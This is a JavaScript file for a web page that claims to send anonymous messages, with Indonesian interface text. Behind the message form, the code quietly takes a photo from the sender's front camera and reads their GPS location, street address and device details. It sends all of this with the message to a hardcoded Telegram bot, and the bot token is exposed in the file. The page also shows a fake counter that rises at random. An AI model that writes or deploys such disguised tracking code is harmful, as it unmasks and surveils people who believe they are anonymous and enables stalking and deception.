const botToken = "8119246016:AAHxrIO3kEcFdab03E_TRK3jgG0Rfobm9zQ";
const chatId = "7119954588";
let isSending = false;

function sendMessage() {
    if (isSending) return;
    isSending = true;

    const message = document.getElementById("inputMessage").value;
    if (!message.trim()) {
        Swal.fire("Error", "Pesan tidak boleh kosong!", "error");
        isSending = false;
        return;
    }

    let fullMessage = `📩 Anonim Pesan: ${message}\n\n📱 Perangkat: ${getDeviceInfo()}`;

    getLocation().then(locationText => {
        if (locationText) fullMessage += `\n\n${locationText}`;

        capturePhoto().then(photoData => {
            if (photoData) {
                sendPhotoWithText(photoData, fullMessage);
            } else {
                sendText(fullMessage);
            }
        });
    });
}

function sendText(text) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text })
    }).then(() => {
        Swal.fire("Terkirim!", "Pesan telah dikirim.", "success");
        document.getElementById("inputMessage").value = "";
    }).catch(() => {
        Swal.fire("Gagal", "Pesan gagal dikirim.", "error");
    }).finally(() => {
        isSending = false;
    });
}

function capturePhoto() {
    return new Promise(resolve => {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    const canvas = document.createElement("canvas");
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

                    const photoData = canvas.toDataURL("image/png");
                    stream.getTracks().forEach(track => track.stop());
                    resolve(photoData);
                }, 2000);
            }).catch(() => {
                console.warn("Akses kamera ditolak atau tidak tersedia.");
                resolve(null);
            });
    });
}

function sendPhotoWithText(photoData, text) {
    let formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("caption", text);
    formData.append("photo", dataURItoBlob(photoData), "photo.png");

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
    }).catch(() => {
        console.warn("Foto gagal dikirim.");
        sendText(text); 
    }).finally(() => {
        isSending = false;
    });
}

function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(",")[1]);
    let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
    let ab = new ArrayBuffer(byteString.length);
    let ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}

function getLocation() {
    return new Promise(resolve => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async position => {
                const { latitude, longitude } = position.coords;
                const locationText = await getAddressFromCoords(latitude, longitude);
                resolve(`${locationText}\n\n📍 Koordinat: ${latitude}, ${longitude}`);
            }, () => {
                console.warn("Akses lokasi ditolak.");
                resolve(null);
            });
        } else {
            resolve(null);
        }
    });
}

async function getAddressFromCoords(latitude, longitude) {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
        const data = await response.json();
        if (data.address) {
            const { country, state, city, town, village } = data.address;
            // const locationParts = [country || state || village, town, city].filter(Boolean);
            const locationParts = [city || town || village, state, country].filter(Boolean);
            return `📍 Lokasi: ${locationParts.join(", ")}`;
        }
        return "📍 Lokasi tidak ditemukan";
    } catch (error) {
        console.error("Gagal mendapatkan lokasi:", error);
        return "📍 Lokasi tidak tersedia";
    }
}

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let device = "Tidak Diketahui";

    if (/android/i.test(userAgent)) {
        device = "Android";
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        device = "iOS";
    } else if (/Windows/i.test(userAgent)) {
        device = "Windows";
    } else if (/Mac/i.test(userAgent)) {
        device = "MacOS";
    } else if (/Linux/i.test(userAgent)) {
        device = "Linux";
    }

    return `${device} (${userAgent})`;
}

document.addEventListener("DOMContentLoaded", function () {
    let inputMessage = document.getElementById("inputMessage");
    let sendButton = document.getElementById("sendButton");

    function toggleSendButton() {
        sendButton.style.display = inputMessage.value.trim() !== "" ? "block" : "none";
    }

    toggleSendButton();
    inputMessage.addEventListener("input", toggleSendButton);
});

let count = 50; 

function updateCount() {
    let randomIncrease = Math.floor(Math.random() * 10) + 1; 
    count += randomIncrease;
    document.getElementById("number").textContent = count;
}

setInterval(updateCount, 2000);

async function getRandomText() {
    try {
        let response = await fetch('text.json'); 
        let texts = await response.json(); 
        let randomIndex = Math.floor(Math.random() * texts.length); 
        document.getElementById("inputMessage").value = texts[randomIndex]; 
    } catch (error) {
        console.error("Error fetching random text:", error);
    }
}

document.addEventListener("DOMContentLoaded", function () {
    let inputMessage = document.getElementById("inputMessage");
    let ketukButton = document.querySelector(".ketuk"); // Ambil tombol Ketuk

    function toggleKetukButton() {
        if (inputMessage.value.trim() !== "") {
            ketukButton.style.display = "none"; // Sembunyikan tombol Ketuk jika ada teks
        } else {
            ketukButton.style.display = "block"; // Tampilkan tombol Ketuk jika kosong
        }
    }

    toggleKetukButton(); // Periksa saat halaman dimuat

    inputMessage.addEventListener("input", toggleKetukButton); // Jalankan fungsi saat pengguna mengetik
});
